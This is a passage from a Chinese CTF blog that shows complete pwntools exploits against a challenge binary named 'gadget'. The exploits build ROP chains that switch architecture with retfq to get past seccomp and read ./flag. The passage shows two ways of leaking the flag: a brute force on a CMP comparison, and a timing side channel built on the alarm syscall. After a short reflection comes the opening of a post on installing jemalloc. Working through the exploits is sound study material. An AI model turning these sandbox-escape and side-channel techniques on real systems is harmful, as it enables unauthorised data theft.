class="line">pop_rsi_pop_r15_pop_rbp_ret=<span class="number">0x401732</span></span><br><span class="line">flag_addr=elf.bss()+<span class="number">0x200</span></span><br><span class="line">ROP_addr=elf.bss()+<span class="number">0x400</span></span><br><span class="line">lea_rsp_pop_0x28=<span class="number">0x40172A</span></span><br><span class="line">cmpa=<span class="number">0x408F72</span></span><br><span class="line"></span><br><span class="line">possible_list = <span class="string">&quot;0123456789_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line">c=<span class="built_in">len</span>(f)</span><br><span class="line">if_ok=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">not</span> if_ok):</span><br><span class="line">    caddr=flag_addr+c</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> possible_list:</span><br><span class="line">        p=process(<span class="string">&#x27;./gadget&#x27;</span>)</span><br><span class="line">        <span class="comment">#gdb.attach(p)</span></span><br><span class="line">        payload=<span class="string">&quot;a&quot;</span>*<span class="number">0x38</span>+p64(pop_rdi_pop_rbp_ret)</span><br><span class="line">        payload+=p64(ROP_addr)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">        payload+=p64(pop_rbp_ret)+p64(ROP_addr+<span class="number">0x20</span>-<span class="number">0x28</span>+<span class="number">0x8</span>)+p64(lea_rsp_pop_0x28)</span><br><span class="line">        <span class="comment">#print(hex(len(payload)))</span></span><br><span class="line">        p.send(payload.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        payload2=<span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        payload2+=p64(retfq)+p64(pop_rbx_pop_r14_pop_r15_pop_rbp_ret)+p64(<span class="number">0x23</span>)</span><br><span class="line">        payload2+=p32(ROP_addr)+p32(<span class="number">0</span>)*<span class="number">3</span>+p32(pop_rcx_ret)+p32(<span class="number">0</span>)</span><br><span class="line">        payload2+=p32(pop_rax_ret)+p32(<span class="number">5</span>)+p32(int_0x80_ret)</span><br><span class="line">        payload2+=p32(retfq)+p32(pop_rdi_pop_rbp_ret)+p32(<span class="number">0x33</span>)</span><br><span class="line">        payload2+=p64(ROP_addr+<span class="built_in">len</span>(payload2)+<span class="number">24</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">        <span class="comment">#print(hex(len(payload2)))</span></span><br><span class="line">        p.send(payload2.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        payload3=p64(pop_rdi_pop_rbp_ret)+p64(<span class="number">3</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        payload3+=p64(pop_rsi_pop_r15_pop_rbp_ret)+p64(flag_addr)+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">        payload3+=p64(pop_rax_ret)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">        payload3+=p64(pop_rdi_pop_rbp_ret)+p64(caddr+<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(read_addr)</span><br><span class="line">        payload3+=p64(pop_rsi_pop_r15_pop_rbp_ret)+p64(<span class="number">0</span>)+p64(caddr-<span class="number">0x38</span>)+p64(<span class="number">0</span>)</span><br><span class="line">        payload3+=p64(pop_rax_ret)+p64(<span class="built_in">ord</span>(guess))+p64(cmpa)</span><br><span class="line">        <span class="comment">#print(hex(len(payload3)))</span></span><br><span class="line">        p.send(payload3.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        payload4=<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0xf</span>+p64(<span class="number">0</span>)</span><br><span class="line">        p.send(payload4)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.send(<span class="string">&#x27;ok&#x27;</span>)</span><br><span class="line">            p.recv(timeout=<span class="number">0.5</span>)</span><br><span class="line">            f+=guess</span><br><span class="line">            <span class="built_in">print</span>(f)</span><br><span class="line">            <span class="keyword">if</span>(guess==<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">                if_ok=<span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            p.close()</span><br><span class="line">    c=c+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>思路3：ORA 侧信道攻击（预期）</strong></p>
<p>“思路3”和“思路2”相似，只是最后“获取flag”的思路有所不同，核心利用如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">000000000040115</span>D                 mov     eax, <span class="number">25</span>h</span><br><span class="line">.text:<span class="number">0000000000401162</span>                 mov     edi, [rbp<span class="number">-8</span>]    ; seconds</span><br><span class="line">.text:<span class="number">0000000000401165</span>                 syscall                 ; LINUX - sys_alarm</span><br><span class="line">.text:<span class="number">0000000000401167</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000401168</span>                 retn</span><br></pre></td></tr></table></figure>
<ul>
<li>可以发现：alarm 会把 [rbp-8] 中的值装入 edi 中，作为关闭进程的时间</li>
<li>所以只要控制 rbp，把单字节的 flag 作为 sys_alarm 的参数，然后记录系统关闭的时间，对比一下就可以计算出 flag</li>
</ul>
<p>现在，利用的关键就在于：如何及时知晓系统关闭的时间？</p>
<ul>
<li>这里我们可以参考“思路1”，“思路2”：使程序陷入循环</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│       <span class="number">0x4011c5</span> (func+<span class="number">21</span>) ◂— push   rsi</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│       <span class="number">0x4011c6</span> (func+<span class="number">22</span>) ◂— ret  </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x401732</span> (install_seccomp+<span class="number">1282</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x401733</span> (install_seccomp+<span class="number">1283</span>) ◂— pop    r15</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x401734</span> (install_seccomp+<span class="number">1284</span>) ◂— pop    rdi</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x401735</span> (install_seccomp+<span class="number">1285</span>) ◂— pop    rbp</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x401736</span> (install_seccomp+<span class="number">1286</span>) ◂— ret    </span><br></pre></td></tr></table></figure>
<ul>
<li>把这两个 gadget 组合一下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bss_payload3 += p64(pop_rsi_r15_rbp) + p64(push_rsi_ret) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">bss_payload3 += p64(push_rsi_ret) <span class="comment"># blocking</span></span><br></pre></td></tr></table></figure>
<ul>
<li>寄存器 rsi 被控制为 “push_rsi_ret”</li>
<li>rsi 压栈，然后被 ret 执行，程序开始不停地执行 “push_rsi_ret”</li>
<li>期间我们可以持续利用 try 向程序输入数据，因为程序陷入循环，所以命令行不起作用</li>
<li>直到 alarm 的时间用尽，程序结束，再输入数据时就会报错，触发 except，并记录时间</li>
</ul>
<p>完整exp为：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">flag = &#123;&#125;</span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"><span class="comment"># addrs</span></span><br><span class="line">bss = <span class="number">0x40c000</span></span><br><span class="line">flag_ch_pos = bss+<span class="number">0x1500</span></span><br><span class="line">fake_stack = bss+<span class="number">0x1000</span></span><br><span class="line">fake_stack2 = bss+<span class="number">0x1100</span></span><br><span class="line">fake_stack3 = bss+<span class="number">0x1200</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">retfq = <span class="number">0x4011ec</span></span><br><span class="line">retf = <span class="number">0x4011ed</span></span><br><span class="line">ret = <span class="number">0x40312c</span></span><br><span class="line">leave_ret = <span class="number">0x7ffff7ffde52</span></span><br><span class="line">pop_rsp_ppp_ret = <span class="number">0x401730</span></span><br><span class="line">pop_rdi_rbp = <span class="number">0x401734</span></span><br><span class="line">pop_rsi_r15_rbp = <span class="number">0x401732</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x401102</span></span><br><span class="line">pop_rax_ret = <span class="number">0x401001</span></span><br><span class="line">pop_rcx_ret = <span class="number">0x40117b</span></span><br><span class="line">pop_rbx_ppp_ret = <span class="number">0x403072</span></span><br><span class="line">int_0x80_ret = <span class="number">0x4011f3</span></span><br><span class="line">syscall_ret = <span class="number">0x408865</span></span><br><span class="line">read_0xc0_gadget = <span class="number">0x401170</span></span><br><span class="line">push_rsi_ret = <span class="number">0x4011c5</span></span><br><span class="line">int3 = <span class="number">0x4011eb</span></span><br><span class="line"></span><br><span class="line">alarm_gadget = <span class="number">0x40115D</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.text:000000000040115D                 mov     eax, 25h</span></span><br><span class="line"><span class="string">.text:0000000000401162                 mov     edi, [rbp-8]    ; seconds</span></span><br><span class="line"><span class="string">.text:0000000000401165                 syscall                 ; LINUX - sys_alarm</span></span><br><span class="line"><span class="string">.text:0000000000401167                 pop     rbp</span></span><br><span class="line"><span class="string">.text:0000000000401168                 retn</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">curr_ch</span>):</span></span><br><span class="line">    <span class="comment"># 121.37.135.138 2102</span></span><br><span class="line">    p = process(<span class="string">&quot;./gadget&quot;</span>)</span><br><span class="line">    <span class="comment">#p = remote(&quot;121.37.135.138&quot;, 2102)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#gdb.attach(p, &quot;b *0x40119a\nc\n&quot;)</span></span><br><span class="line">    offset = <span class="number">0x38</span></span><br><span class="line">    move_stack_payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x38</span> + p64(pop_rdi_rbp) + p64(fake_stack)*<span class="number">2</span> + p64(read_0xc0_gadget) <span class="comment"># read part1</span></span><br><span class="line">    move_stack_payload += p64(pop_rsp_ppp_ret) + p64(fake_stack) <span class="comment"># start part1</span></span><br><span class="line">    p.send(move_stack_payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># part 1</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    bss_payload = <span class="string">b&quot;./flag\x00\x00&quot;</span> <span class="comment"># new rbp</span></span><br><span class="line">    bss_payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    bss_payload += p64(retfq) + p64(ret) + p64(<span class="number">0x23</span>) <span class="comment"># change to x86</span></span><br><span class="line">    </span><br><span class="line">	<span class="comment"># SYS_open</span></span><br><span class="line">    bss_payload += p32(pop_rax_ret) + p32(<span class="number">5</span>) </span><br><span class="line">    bss_payload += p32(pop_rbx_ppp_ret) + p32(fake_stack) + p32(fake_stack)*<span class="number">3</span></span><br><span class="line">    bss_payload += p32(pop_rcx_ret) + p32(<span class="number">0</span>)</span><br><span class="line">    bss_payload += p32(int_0x80_ret) </span><br><span class="line">    </span><br><span class="line">    bss_payload += p32(ret) + p32(retf) + p32(ret) + p32(<span class="number">0x33</span>) <span class="comment"># change to x64</span></span><br><span class="line">    bss_payload += p64(pop_rdi_rbp) + p64(fake_stack2)*<span class="number">2</span> + p64(read_0xc0_gadget) <span class="comment"># read part2</span></span><br><span class="line">    bss_payload += p64(pop_rsp_ppp_ret) + p64(fake_stack2)  <span class="comment"># start part2</span></span><br><span class="line"></span><br><span class="line">    p.send(bss_payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># part2</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    bss_payload2 = p64(<span class="number">0xdeadbeef</span>) <span class="comment"># new rbp</span></span><br><span class="line">    bss_payload2 += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># SYS_read</span></span><br><span class="line">    bss_payload2 += p64(pop_rax_ret) + p64(<span class="number">0</span>)  </span><br><span class="line">    bss_payload2 += p64(pop_rdi_rbp) + p64(<span class="number">3</span>) + p64(<span class="number">0xdeadbeef</span>) </span><br><span class="line">    bss_payload2 += p64(pop_rsi_r15_rbp) + p64(flag_ch_pos-curr_ch) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    bss_payload2 += p64(syscall_ret) </span><br><span class="line"></span><br><span class="line">    bss_payload2 += p64(pop_rdi_rbp) + p64(flag_ch_pos+<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(read_0xc0_gadget) <span class="comment"># rewrite high bits</span></span><br><span class="line">    bss_payload2 += p64(pop_rdi_rbp) + p64(fake_stack3)*<span class="number">2</span> + p64(read_0xc0_gadget) <span class="comment"># read part3</span></span><br><span class="line">    bss_payload2 += p64(pop_rsp_ppp_ret) + p64(fake_stack3)  <span class="comment"># start part3</span></span><br><span class="line">    </span><br><span class="line">    p.send(bss_payload2)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># rewrite</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    p.send(<span class="string">b&quot;\x00&quot;</span>*<span class="number">0x7</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># part3</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    bss_payload3 = p64(<span class="number">0xdeadbeef</span>) <span class="comment"># new rbp</span></span><br><span class="line">    bss_payload3 += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    bss_payload3 += p64(pop_rbp_ret) + p64(flag_ch_pos+<span class="number">8</span>)</span><br><span class="line">    bss_payload3 += p64(alarm_gadget) <span class="comment"># alarm gadget</span></span><br><span class="line">    bss_payload3 += p64(<span class="number">0xdeadbeef</span>) </span><br><span class="line">    </span><br><span class="line">    bss_payload3 += p64(pop_rsi_r15_rbp) + p64(push_rsi_ret) + p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    bss_payload3 += p64(push_rsi_ret) <span class="comment"># blocking</span></span><br><span class="line"></span><br><span class="line">    p.send(bss_payload3)</span><br><span class="line">    start = time.time()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.send(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            end = time.time()</span><br><span class="line">            time_used = <span class="built_in">int</span>(end-start)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[ROUND <span class="subst">&#123;curr_ch&#125;</span>] Time used:&quot;</span>, end-start)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[ROUND <span class="subst">&#123;curr_ch&#125;</span>] CHAR: &#x27;<span class="subst">&#123;<span class="built_in">chr</span>(time_used)&#125;</span>&#x27; (<span class="subst">&#123;<span class="built_in">hex</span>(time_used)&#125;</span>)&quot;</span>)</span><br><span class="line">            lock.acquire()</span><br><span class="line">            flag[curr_ch] = <span class="built_in">chr</span>(time_used)</span><br><span class="line">            lock.release()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[ROUND <span class="subst">&#123;curr_ch&#125;</span>] ERROR&quot;</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pool = []</span><br><span class="line">    <span class="keyword">for</span> _<span class="built_in">round</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>): <span class="comment"># 因为flag只有9位,所以这里只申请9个线程</span></span><br><span class="line">        th = threading.Thread(target=exp, args=(_<span class="built_in">round</span>, ))</span><br><span class="line">        th.setDaemon = <span class="literal">True</span></span><br><span class="line">        pool.append(th)</span><br><span class="line">        th.start()</span><br><span class="line">    <span class="keyword">for</span> th <span class="keyword">in</span> pool:</span><br><span class="line">        th.join()</span><br><span class="line">    flag = &#123;k: v <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">sorted</span>(flag.items(), key=<span class="keyword">lambda</span> item: item[<span class="number">0</span>])&#125;    </span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    flag_str = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> flag.items():</span><br><span class="line">        flag_str = flag_str + v</span><br><span class="line">    <span class="built_in">print</span>(flag_str)</span><br></pre></td></tr></table></figure>
<p><img src="/2022/06/02/gadget+ORA+CMP%20trick/1654104946998.png" alt="1654104946998"> </p>
<hr>
<p><strong>小结：</strong></p>
<p>这个题目是组里的大佬出的，去年复现的时候就是调了一下 exp，gadget 都没有自己找，如今再看看这个题目，还是可以学习到很多东西</p>
<p>网上的非预期都是依靠 CMP 指令，单字节对比 flag 和猜测值，然后爆破出 flag，这种思路的关键就是想方设法 “放大CMP” 的影响，将其反应到用户端，使 exp 可以检测到（当然合适的 gadget 也很难找）</p>
<ul>
<li>网上常见的几种 exp 的处理：使程序陷入循环，然后 try-recv() 报错信息</li>
</ul>
<p>最后的 ORA 是我以前没有遇见过的，去年的复现根本就没有考虑过这个方法，这个方法的 exp 执行过程很卡，如果 flag 特别长，服务器的网络不好的话，就很容易崩</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/31/Jemalloc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/31/Jemalloc/" class="post-title-link" itemprop="url">Jemalloc</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-31 23:08:03" itemprop="dateCreated datePublished" datetime="2022-05-31T23:08:03+08:00">2022-05-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-06-06 22:12:25" itemprop="dateModified" datetime="2022-06-06T22:12:25+08:00">2022-06-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>34k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>31 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="Jemalloc-安装-amp-使用"><a href="#Jemalloc-安装-amp-使用" class="headerlink" title="Jemalloc 安装&amp;使用"></a>Jemalloc 安装&amp;使用</h2><p>jemalloc 是 Facebook 推出的一种通用 malloc 实现，在 FreeBSD、firefox 中被广泛使用，比起 ptmalloc2 具有更高的性能</p>
<p><strong>编译安装</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/jemalloc/jemalloc/releases/download/5.0.1/jemalloc-5.0.1.tar.bz2</span><br><span class="line">tar -xjvf jemalloc-5.0.1.tar.bz2</span><br><span class="line">cd jemalloc-5.0.1</span><br><span class="line">./configure --prefix=/usr/local/jemalloc --enable-debug</span><br><span class="line">make -j4 &amp;&amp; sudo make install</span><br></pre></td></tr></table></figure>
<p>接下来修改链接信息： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo bash</span><br><span class="line">echo /usr/local/jemalloc/ &gt;&gt; /etc/ld.so.conf.d/jemalloc.conf</span><br><span class="line">echo /usr/local/lib &gt;&gt; /etc/ld.so.conf</span><br><span class="line">ldconfig</span><br></pre></td></tr></table></figure>
<p><strong>使用</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jemalloc/jemalloc.h&gt;</span></span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">jemalloc_test</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">malloc</span>(i*<span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">                jemalloc_test(i);</span><br><span class="line">        &#125;</span><br><span class="line">        malloc_stats_print(<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用 GCC 进行编译：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc jemalloc.c -o jemalloc -ljemalloc</span><br></pre></td></tr></table></figure>
<p>演示：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> gcc test.c -o jemalloc -ljemalloc</span><br><span class="line">➜  <span class="built_in">exp</span> ldd jemalloc</span><br><span class="line">	linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff753f8000</span>)</span><br><span class="line">	libjemalloc.so<span class="number">.2</span> =&gt; /usr/local/lib/libjemalloc.so<span class="number">.2</span> (<span class="number">0x00007f6caa002000</span>)</span><br><span class="line">	libc.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0x00007f6ca9e10000</span>)</span><br><span class="line">	libstdc++.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libstdc++.so<span class="number">.6</span> (<span class="number">0x00007f6ca9bf6000</span>)</span><br><span class="line">	libpthread.so<span class="number">.0</span> =&gt; /lib/x86_64-linux-gnu/libpthread.so<span class="number">.0</span> (<span class="number">0x00007f6ca9bd3000</span>)</span><br><span class="line">	libdl.so<span class="number">.2</span> =&gt; /lib/x86_64-linux-gnu/libdl.so<span class="number">.2</span> (<span class="number">0x00007f6ca9bcd000</span>)</span><br><span class="line">	libgcc_s.so<span class="number">.1</span> =&gt; /lib/x86_64-linux-gnu/libgcc_s.so<span class="number">.1</span> (<span class="number">0x00007f6ca9bb0000</span>)</span><br><span class="line">	/lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007f6caa2a6000</span>)</span><br><span class="line">	libm.so<span class="number">.6</span> =&gt; /lib/x86_64-linux-gnu/libm.so<span class="number">.6</span> (<span 